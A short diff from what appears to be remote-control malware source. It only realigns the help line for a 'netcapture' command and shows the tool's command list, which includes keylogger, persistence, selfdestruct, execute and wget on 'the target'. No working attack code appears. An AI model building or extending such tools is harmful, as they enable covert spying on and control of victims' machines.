@@ -44,7 +44,7 @@ unzip <file>        - Unzip a file.
 upload <file>       - Upload a file.
 wget <url>          - Download a file from the web.
 keylogger           - Active keylogger on the target.
-netcapture           - Launch a capture on the target.'''
+netcapture          - Launch a capture on the target.'''
 COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
              'persistence', 'quit', 'scan', 'selfdestruct', 'survey',
              'unzip', 'upload', 'wget', 'keylogger', 'netcapture' ]
